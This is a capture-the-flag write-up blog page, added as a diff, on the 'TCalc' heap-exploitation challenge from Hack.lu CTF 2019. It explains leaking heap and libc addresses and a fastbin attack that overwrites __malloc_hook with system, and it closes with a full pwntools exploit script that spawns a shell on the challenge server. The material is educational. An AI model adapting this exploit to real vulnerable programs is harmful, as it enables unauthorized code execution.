@@ -1,0 +1,501 @@
+<!doctype html>
+<html lang="">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>TCalc - Hack.lu CTF 2019 - slashb4sh</title>
+    <meta name="HandheldFriendly" content="True">
+    <meta name="MobileOptimized" content="320">
+    <meta name="referrer" content="no-referrer">
+    <meta name="description" content="">
+    <meta property="og:site_name" content="slashb4sh" />
+    <meta property="og:locale" content="nn_NO" />
+    <meta property="og:type" content="article" />
+    <meta property="og:url" content="/blog/tcalc/" />
+    <meta property="og:title" content="TCalc - Hack.lu CTF 2019" />
+    <meta property="og:image" content="/" />
+    <meta property="og:description" content="" />
+
+    
+        <meta property="twitter:site" content="@twitter.com/slashb4sh">
+    
+
+    <meta property="twitter:title" content="TCalc - Hack.lu CTF 2019" />
+    <meta property="twitter:image" content="/" />
+    <meta property="twitter:card" content="summary" />
+    <meta property="twitter:description" content="" />
+
+    
+
+    <link rel="canonical" href="/blog/tcalc/">
+
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+
+    <link rel="stylesheet" href="/css/main.css" />
+
+    
+        <link rel="stylesheet" href="/css/highlight.css" />
+    
+
+    
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/progressively/1.2.5/progressively.min.css" integrity="sha256-xbqLYBMsjpuCihs+3Fgp/MFMtPdo2SWKoOjEWOqR4X0=" crossorigin="anonymous" />
+    
+
+    <link rel="shortcut icon"
+          href="/img/favicon.ico">
+
+    <link href='' rel="alternate" type="application/rss+xml" title="slashb4sh" />
+    <link href="https://fonts.googleapis.com/css?family=Fira+Code|Merriweather+Sans:400,700|Merriweather:400,700&display=swap" rel="stylesheet">
+</head>
+
+<body>
+    
+    
+
+    
+
+    
+
+<div class="my-4 my-md-5 header">
+    <div class="container">
+        <div class="row">
+            <div class="col-auto d-none d-md-block">
+                
+            </div>
+            <div class="col-auto align-self-center mr-auto">
+                <a href="/">
+                    <h1 class="font-weight-bold name">
+                        slashb4sh
+                    </h1>
+                </a>
+
+                <ul class="nav nav-primary">
+                    
+                        <li class="nav-item">
+                            <a class="text-uppercase nav-link text-blog" href="/blog/">
+                                
+                                Blog
+                            </a>
+                        </li>
+                    
+                        <li class="nav-item">
+                            <a class="text-uppercase nav-link text-about" href="/about/">
+                                
+                                About
+                            </a>
+                        </li>
+                    
+
+                    
+                </ul>
+
+                <ul class="nav nav-secondary">
+                    
+                </ul>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+    <div class="content">
+        <div class="container">
+            <div class="row justify-content-center">
+                <div
+                    
+                    class="col-md-9 col-lg-9"
+                    
+                >
+                    <h1 class="mx-0 mx-md-4">
+                        TCalc - Hack.lu CTF 2019
+                    </h1>
+
+                    <div class="mb-4 mb-md-5 meta">
+                        <span class="date" title='Sat Oct 26 2019 13:00:00 UTC'>
+                            October 26, 2019
+                        </span>
+
+                        
+                            
+                        
+
+                        <span class="reading-time middot">
+                            6 minutes
+                        </span>
+
+                        <div class="d-none d-md-inline tags">
+                            <ul class="list-unstyled d-inline">
+                                
+                                    <li class="d-inline middot">
+                                        <a href="/tags/ctf">CTF</a>
+                                    </li>
+                                
+                                    <li class="d-inline middot">
+                                        <a href="/tags/writeup">writeup</a>
+                                    </li>
+                                
+                                    <li class="d-inline middot">
+                                        <a href="/tags/pwn">Pwn</a>
+                                    </li>
+                                
+                            </ul>
+                        </div>
+
+                        <div class="d-none d-md-inline tags">
+                            <ul class="list-unstyled d-inline">
+                                
+                                
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="markdown">
+                        
+    
+    <p>Linux heap exploitation of an arbitary free vulnerability</p>
+<!-- raw HTML omitted -->
+<p><strong>Challenge points</strong>: 381
+<strong>No. of solves</strong>: 16</p>
+<p>This was a fun challenge. It is a menu driven program where you can store a set of numbers and also retreive the average of the numbers.
+The challenges runs in an environment with glibc 2.30, It has tcache double free mitigation, as explained in my last <a href="https://blog.bi0s.in/2019/10/20/Pwn/remain/">blog</a>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$ ./chall
+------------------
+What <span style="color:#66d9ef">do</span>?
+1<span style="color:#f92672">)</span> get numbers
+2<span style="color:#f92672">)</span> print_average
+3<span style="color:#f92672">)</span> delete_numbers
+&gt;
+</code></pre></div><p>get numbers</p>
+<ul>
+<li>store maximum of 10 set of numbers on a heap chunk, no restriction to the count of numbers in one set</li>
+<li>calloc(count + 1, 8uLL) is called to allocate memory for the numbers, The first 8 bytes is used to store the count</li>
+<li>calloc() nulls out the memory region. Also, calloc doesn&rsquo;t allocate from tcache</li>
+</ul>
+<p>print_average</p>
+<ul>
+<li>gets index from user and prints average of the numbers at that index</li>
+<li>index is not validated, leading to potential information leaks</li>
+</ul>
+<p>delete_numbers</p>
+<ul>
+<li>free() the pointer holding a set of numbers at a particular index and pointer is nulled out.</li>
+<li>index is not validated, giving us aribiary free</li>
+</ul>
+<p>The table, holding all the pointers to the set of numbers, is on the heap. The allocations made to store the numbers are right below the table.</p>
+<p>Using the <code>out of bound indexing</code> we can free any chunk on the heap. As of now we do not have a heap leak to perform arbitary free. Let&rsquo;s first get the heap leak</p>
+<h4 id="how-to-get-a-heap-leak">How to get a heap leak?</h4>
+<p>To leak information using the <code>out of bounds</code> bug we invoke <code>print_average</code> but for this there needs be a proper structure to the heap chunk. The 1st 8 bytes should be the count of the numbers, followed by the numbers themselves, the count is used to add up the numbers in a for loop, if count is too large then the program will segfault accessing invalid memory. We need to craft a chunk such that the 1st 8 bytes contain the count, it should be a reasonably low value and next few blocks should contain the information we want to leak.
+To achieve this layout, I first freed a chunk in the tcache range, when you free a chunk in tcache range the a key is set to tcache structure&rsquo;s address.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">This is what the chunk looks like after free
+	0x55555555a300: 0x0000000000000000  0x0000000000000061
+	0x55555555a310: 0x0000000000000000  0x0000555555559010   # tcache structure
+	0x55555555a320: 0x0000000000000002  0x0000000000000003
+	0x55555555a330: 0x0000000000000004  0x0000000000000005
+	0x55555555a340: 0x0000000000000006  0x0000000000000007
+	0x55555555a350: 0x0000000000000008  0x0000000000000009
+tcache structure
+	0x555555559000: 0x0000000000000000  0x0000000000000291
+	0x555555559010: 0x0000000000000000  0x0000000000000001
+	0x555555559020: 0x0000000000000000  0x0000000000000000
+	0x555555559030: 0x0000000000000000  0x0000000000000000
+	0x555555559040: 0x0000000000000000  0x0000000000000000
+	0x555555559050: 0x0000000000000000  0x0000000000000000
+</code></pre></div><p>As you can see there is a pointer to the tcache structure on the heap, plus this is a valid pointer for free
+Now I freed this pointer with the <code>out of bounds</code> indexing. Let&rsquo;s see what the tcache structure looks like now</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">	0x555555559000: 0x0000000000000000  0x0000000000000291
+	0x555555559010: 0x0000000000000000  0x0000555555559010
+	0x555555559020: 0x0000000000000000  0x0000000000000000
+	0x555555559030: 0x0000000000000000  0x0000000000000000
+	0x555555559040: 0x0000000000000000  0x0000000000000000
+</code></pre></div><p>Now I allocate and free a chunk of size 0x20, This sets the tcache count of 0x20 bin to 1.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">	0x555555559000: 0x0000000000000000  0x0000000000000291
+	0x555555559010: 0x0000000000000001  0x0000555555559010
+	0x555555559020: 0x0000000000000000  0x0000000000000000
+	0x555555559030: 0x0000000000000000  0x0000000000000000
+</code></pre></div><p>Now the tcache structure resembles the structure used to store the set of numbers. The first 8 bytes is the count, which is 1, and the next 8 bytes conatin a heap address. Invoke the <code>print_average</code> function on the tcache structure.
+Now that we have the heap leak we can forge chunks on the heap and free arbitary chunks.</p>
+<h4 id="libc-leak">Libc leak</h4>
+<p>Getting a libc leak is quite simple</p>
+<ul>
+<li>free a 0x440 (or any size greater than tcache range) chunk so that it gets inserted to the unsorted bin, as you know, the fd and bk are libc addresses</li>
+<li>allocate a large chunk of size less than 0x440 so the 0x440 chunk is split and the rest is put back in the unsorted bin</li>
+<li>we split the chunk so that the size of the chunk is small and can we are going to use it as the faked count of numbers</li>
+<li>write heap address of the structure such that the size of the heap chunk is the count of numbers and invoke <code>print_average</code> on it.</li>
+<li>The average of all the data is print out. Extract the libc address by simply reversing the calculations.</li>
+</ul>
+<h4 id="exploitation">Exploitation</h4>
+<p>We need arbitary write to get code execution, so we need calloc to allocate a chunk of our choice. Since calloc doesn&rsquo;t allocate chunks off the tcache bins, there is no point in corrupting the fd of tcache chunks. Chunks get allocated from the fastbin though, we can overwrite the next pointer of a free pointer to get arbitary write, our target is restricted to <code>__malloc_hook</code> as we can easily forge a size(0x7f), but this is not a an issue. (We cannot carry out a traditional fastbin double free corruption as we do not control the fd directly as it is used for count)</p>
+<p>We will have to work with 0x70 chunks to carry out the fastbin attacks. We had already overwritten the tcache count for 0x70 chunk with value much greater than 7 when tcache structure was freed. Further freed chunks will be put in fastbin.</p>
+<p>To do the fastbin attack:</p>
+<ul>
+<li>allocate a chunk and create a fake chunk of size 0x71 ( choose any size that will be freed into the fastbin and can be allocated back with calloc() ).</li>
+<li>This fake chunk will be freed and allocated back as an overlapping chunk to overwrite the next pointer of an free fastbin chunk lying right below</li>
+<li>allocate the target chunk of 0x71 size</li>
+<li>free the target chunk</li>
+<li>free the fake chunk by using arbitary free</li>
+<li>allocate a chunk of 0x70 size, the fake chunk will be returned, now overwrite the fd of the target chunk with address of the misalligned chunk above <code>__malloc_hook</code> such that the size field is 0x7f.</li>
+<li>allocate the target chunk</li>
+<li>The next allocation will give you write to <code>__malloc_hook</code></li>
+</ul>
+<p>Overwrite <code>__malloc_hook</code> with system and call <code>malloc</code> with heap address pointing to <code>&quot;/bin/sh&quot;</code> ( <code>get_numbers</code> should be given addr/8 as <code>calloc</code> calls <code>malloc</code> with arguments as arg1*arg2 ).
+You got shell :)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#75715e">#s=process(&#34;./calc&#34;,env={&#39;LD_PRELOAD&#39;: &#39;./libc.so.6&#39;})</span>
+s<span style="color:#f92672">=</span>remote(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">tcalc.forfuture.fluxfingers.net</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">1337</span>)
+libc<span style="color:#f92672">=</span>ELF(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">./libc.so.6</span><span style="color:#e6db74">&#34;</span>)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add</span>(num, x):
+    s<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&gt;</span><span style="color:#e6db74">&#34;</span>, str(<span style="color:#ae81ff">1</span>))
+    s<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&gt;</span><span style="color:#e6db74">&#34;</span>, str(num))
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> x:
+        s<span style="color:#f92672">.</span>sendline(str(i))
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">show</span>(idx):
+    s<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&gt;</span><span style="color:#e6db74">&#34;</span>, str(<span style="color:#ae81ff">2</span>))
+    s<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&gt;</span><span style="color:#e6db74">&#34;</span>, str(idx))
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>(idx):
+    s<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&gt;</span><span style="color:#e6db74">&#34;</span>, str(<span style="color:#ae81ff">3</span>))
+    s<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&gt;</span><span style="color:#e6db74">&#34;</span>, str(idx))
+<span style="color:#75715e"># free a chunk and free the tcache struct</span>
+add(<span style="color:#ae81ff">10</span>,[<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">9</span>,<span style="color:#ae81ff">10</span>])
+free(<span style="color:#ae81ff">0</span>)
+free(<span style="color:#ae81ff">0x20f</span>)
+<span style="color:#75715e"># set count of tcache 0x20 bin to 1 so as to have a crafted set of numbers with cnt=1</span>
+add(<span style="color:#ae81ff">1</span>,[<span style="color:#ae81ff">1</span>])
+free(<span style="color:#ae81ff">0</span>)
+<span style="color:#75715e"># Heap leak</span>
+show(<span style="color:#ae81ff">0x21b</span>)
+s<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">The average is: </span><span style="color:#e6db74">&#34;</span>)
+heap <span style="color:#f92672">=</span> int(s<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">.</span><span style="color:#e6db74">&#34;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])<span style="color:#f92672">-</span><span style="color:#ae81ff">0x10</span>
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Heap leak = </span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> hex(heap))
+<span style="color:#75715e"># get libc leak</span>
+add(<span style="color:#ae81ff">0x430</span><span style="color:#f92672">/</span><span style="color:#ae81ff">8</span>,[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
+add(<span style="color:#ae81ff">1</span>,[heap<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1698</span>])
+free(<span style="color:#ae81ff">0</span>)
+add(<span style="color:#ae81ff">0x300</span><span style="color:#f92672">/</span><span style="color:#ae81ff">8</span>,[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
+show(<span style="color:#ae81ff">0x2a7</span>)
+s<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">The average is: </span><span style="color:#e6db74">&#34;</span>)
+base <span style="color:#f92672">=</span> int(s<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">.</span><span style="color:#e6db74">&#34;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
+base <span style="color:#f92672">=</span> ((base<span style="color:#f92672">*</span><span style="color:#ae81ff">0x131</span>)<span style="color:#f92672">-</span><span style="color:#ae81ff">0x000000000001f821</span><span style="color:#f92672">-</span>(heap<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1698</span>)<span style="color:#f92672">-</span><span style="color:#ae81ff">0x0000000000000001</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x0000000000000020</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x0000000000000130</span>)<span style="color:#f92672">/</span><span style="color:#ae81ff">2</span>
+base <span style="color:#f92672">=</span> (base <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xfffffffffffff000</span>)<span style="color:#f92672">-</span><span style="color:#ae81ff">0x1c0000</span>
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">libc leak = </span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> hex(base))
+system <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">system</span><span style="color:#e6db74">&#39;</span>]
+malloc_hook <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">__malloc_hook</span><span style="color:#e6db74">&#39;</span>]
+malloc_fake <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1c09ad</span>
+shell <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18b1ac</span>
+free(<span style="color:#ae81ff">0</span>)
+free(<span style="color:#ae81ff">1</span>)
+<span style="color:#66d9ef">print</span> hex(system)
+what <span style="color:#f92672">=</span> system
+part1 <span style="color:#f92672">=</span> (what<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0x000000ffffffffff</span>)<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">24</span>
+part2 <span style="color:#f92672">=</span> (what<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0x0000ff0000000000</span>)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">40</span>
+<span style="color:#66d9ef">print</span> hex(part1)
+<span style="color:#66d9ef">print</span> hex(part2)
+add(<span style="color:#ae81ff">12</span>,[<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">9</span>,<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">113</span>,<span style="color:#ae81ff">114</span>])
+add(<span style="color:#ae81ff">12</span>,[<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">9</span>,<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">0x31</span>,<span style="color:#ae81ff">114</span>])
+add(<span style="color:#ae81ff">2</span>,{<span style="color:#ae81ff">1</span>, heap<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1700</span>})
+free(<span style="color:#ae81ff">1</span>)
+free(<span style="color:#ae81ff">0x29d</span>)
+add(<span style="color:#ae81ff">12</span>,[<span style="color:#ae81ff">0x71</span>,malloc_fake,<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
+add(<span style="color:#ae81ff">12</span>,[<span style="color:#ae81ff">0x0068732f6e69622f</span>,<span style="color:#ae81ff">0x0068732f6e69622f</span>,<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]) 
+<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">the write is not aligned so system is written as two parts </span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">part1 is the last 5 bytes and part2 is the 6th last byte which is 0x7f</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">part1 is left shifted by 24 bits, so the number we give starts with the 5th last byte</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">if the 5th last byte is greater than 0x7f the write get corrupted</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+add(<span style="color:#ae81ff">12</span>,[<span style="color:#ae81ff">1</span>,part1,part2,<span style="color:#ae81ff">0x3333333333333333</span>,<span style="color:#ae81ff">0x4444444444444444</span>,<span style="color:#ae81ff">0x5555555555555555</span>,<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
+<span style="color:#75715e"># pass heap address of &#34;/bin/sh&#34; to malloc as argument to system when __malloc_hook is triggered</span>
+add(((heap<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1718</span>)<span style="color:#f92672">/</span><span style="color:#ae81ff">8</span>),[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
+s<span style="color:#f92672">.</span>interactive()
+</code></pre></div>
+
+
+                    </div>
+                </div>
+
+                
+                    <div class="col-sm-12 col-md-3">
+                        <nav id="TableOfContents" class="sticky-top">
+  <ul>
+    <li>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+                    </div>
+                
+            </div>
+
+            <div class="row">
+                <div
+                    
+                    class="col-md-9 col-lg-9"
+                    
+                >
+                    
+                        <div class="navigation">
+                            <div class="row">
+                                <div class="col-12 col-md-6">
+                                    
+                                        <div class="mx-0 mx-md-4 mt-4 text-left">
+                                            <a href="/blog/schnurtelefon/">
+                                                <span class="icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 477.175 477.175">
+        <path d="M145.188,238.575l215.5-215.5c5.3-5.3,5.3-13.8,0-19.1s-13.8-5.3-19.1,0l-225.1,225.1c-5.3,5.3-5.3,13.8,0,19.1l225.1,225 c2.6,2.6,6.1,4,9.5,4s6.9-1.3,9.5-4c5.3-5.3,5.3-13.8,0-19.1L145.188,238.575z" />
+    </svg>
+</span>
+
+                                                <span class="text">Schnurtelefon - Hack.lu CTF 2019</span>
+                                            </a>
+                                        </div>
+                                    
+                                </div>
+                                <div class="col-12 col-md-6">
+                                    
+                                        <div class="mx-0 mx-md-4 mt-4 text-right">
+                                            <a href="/blog/thinktwice/">
+                                                <span class="text">Think-twice - HackTM 2020</span>
+                                                <span class="icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 477.175 477.175">
+        <path d="M360.731,229.075l-225.1-225.1c-5.3-5.3-13.8-5.3-19.1,0s-5.3,13.8,0,19.1l215.5,215.5l-215.5,215.5 c-5.3,5.3-5.3,13.8,0,19.1c2.6,2.6,6.1,4,9.5,4c3.4,0,6.9-1.3,9.5-4l225.1-225.1C365.931,242.875,365.931,234.275,360.731,229.075z" />
+    </svg>
+</span>
+
+                                            </a>
+                                        </div>
+                                    
+                                </div>
+                            </div>
+                        </div>
+                    
+
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="my-4 footer">
+    <div class="container">
+        <div class="row justify-content-center">
+            <div class="col-sm-12 col-md-6 col-lg-5">
+                <div class="mx-0 mx-md-4 mb-2 text-center text-md-left">
+                    
+
+                    
+                </div>
+            </div>
+            <div class="col-sm-12 col-md-6 col-lg-5">
+                <div class="mx-0 mx-md-4 text-center text-md-right">
+                    
+
+                    
+
+                    
+    <a href="https://github.com/github.com/maheshhari"
+        target="_blank"
+        class="mx-1 ml-md-2 mr-md-0 icon"
+        aria-label="GitHub">
+
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" fill-rule="evenodd" clip-rule="evenodd" stroke-linejoin="round" stroke-miterlimit="1.414">
+            <path d="M8 0C3.58 0 0 3.582 0 8c0 3.535 2.292 6.533 5.47 7.59.4.075.547-.172.547-.385 0-.19-.007-.693-.01-1.36-2.226.483-2.695-1.073-2.695-1.073-.364-.924-.89-1.17-.89-1.17-.725-.496.056-.486.056-.486.803.056 1.225.824 1.225.824.714 1.223 1.873.87 2.33.665.072-.517.278-.87.507-1.07-1.777-.2-3.644-.888-3.644-3.953 0-.873.31-1.587.823-2.147-.09-.202-.36-1.015.07-2.117 0 0 .67-.215 2.2.82.64-.178 1.32-.266 2-.27.68.004 1.36.092 2 .27 1.52-1.035 2.19-.82 2.19-.82.43 1.102.16 1.915.08 2.117.51.56.82 1.274.82 2.147 0 3.073-1.87 3.75-3.65 3.947.28.24.54.73.54 1.48 0 1.07-.01 1.93-.01 2.19 0 .21.14.46.55.38C13.71 14.53 16 11.53 16 8c0-4.418-3.582-8-8-8"/>
+        </svg>
+    </a>
+
+
+                    
+
+                    
+    <a href="https://twitter.com/twitter.com/slashb4sh"
+        target="_blank"
+        class="mx-1 ml-md-2 mr-md-0 icon"
+        aria-label="Twitter">
+
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" fill-rule="evenodd" clip-rule="evenodd" stroke-linejoin="round" stroke-miterlimit="1.414">
+            <path d="M16 3.038c-.59.26-1.22.437-1.885.517.677-.407 1.198-1.05 1.443-1.816-.634.37-1.337.64-2.085.79-.598-.64-1.45-1.04-2.396-1.04-1.812 0-3.282 1.47-3.282 3.28 0 .26.03.51.085.75-2.728-.13-5.147-1.44-6.766-3.42C.83 2.58.67 3.14.67 3.75c0 1.14.58 2.143 1.46 2.732-.538-.017-1.045-.165-1.487-.41v.04c0 1.59 1.13 2.918 2.633 3.22-.276.074-.566.114-.865.114-.21 0-.41-.02-.61-.058.42 1.304 1.63 2.253 3.07 2.28-1.12.88-2.54 1.404-4.07 1.404-.26 0-.52-.015-.78-.045 1.46.93 3.18 1.474 5.04 1.474 6.04 0 9.34-5 9.34-9.33 0-.14 0-.28-.01-.42.64-.46 1.2-1.04 1.64-1.7z" fill-rule="nonzero"/>
+        </svg>
+    </a>
+
+
+                    
+
+                    
+
+                    
+
+                    
+    <a href="mailto:maheshpdm2@gmail.com"
+        class="mx-1 ml-md-2 mr-md-0 icon"
+        aria-label="Email">
+
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 14 16">
+            <path d="M0 4v8c0 .55.45 1 1 1h12c.55 0 1-.45 1-1V4c0-.55-.45-1-1-1H1c-.55 0-1 .45-1 1zm13 0L7 9 1 4h12zM1 5.5l4 3-4 3v-6zM2 12l3.5-3L7 10.5 8.5 9l3.5 3H2zm11-.5l-4-3 4-3v6z"/>
+        </svg>
+    </a>
+
+
+                    <a href=''
+    class="mx-1 ml-md-2 mr-md-0 icon"
+    aria-label="RSS">
+
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" fill-rule="evenodd" clip-rule="evenodd" stroke-linejoin="round" stroke-miterlimit="1.414">
+        <path d="M12.8 16C12.8 8.978 7.022 3.2 0 3.2V0c8.777 0 16 7.223 16 16h-3.2zM2.194 11.61c1.21 0 2.195.985 2.195 2.196 0 1.21-.99 2.194-2.2 2.194C.98 16 0 15.017 0 13.806c0-1.21.983-2.195 2.194-2.195zM10.606 16h-3.11c0-4.113-3.383-7.497-7.496-7.497v-3.11c5.818 0 10.606 4.79 10.606 10.607z"/>
+    </svg>
+</a>
+
+
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+    <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
+
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/highlight.min.js" integrity="sha256-1zu+3BnLYV9LdiY85uXMzii3bdrkelyp37e0ZyTAQh0=" crossorigin="anonymous"></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/bash.min.js" defer></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/css.min.js" defer></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/diff.min.js" defer></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/django.min.js" defer></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/javascript.min.js" defer></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/python.min.js" defer></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/yaml.min.js" defer></script>
+        
+        <script>
+            window.addEventListener('load', function() {
+                hljs.initHighlighting();
+            }, true);
+        </script>
+    
+
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/progressively/1.2.5/progressively.min.js" integrity="sha256-LvFVlLdfGI3WeEH+8Ni4kxLm02g2GlOfeGCGLXfRk/U=" crossorigin="anonymous"></script>
+        <script>
+            window.addEventListener('load', function() {
+                progressively.init({delay: 30, throttle: 50});
+            }, true);
+        </script>
+    
+
+    
+
+    
+    
+</body>
+
+</html>
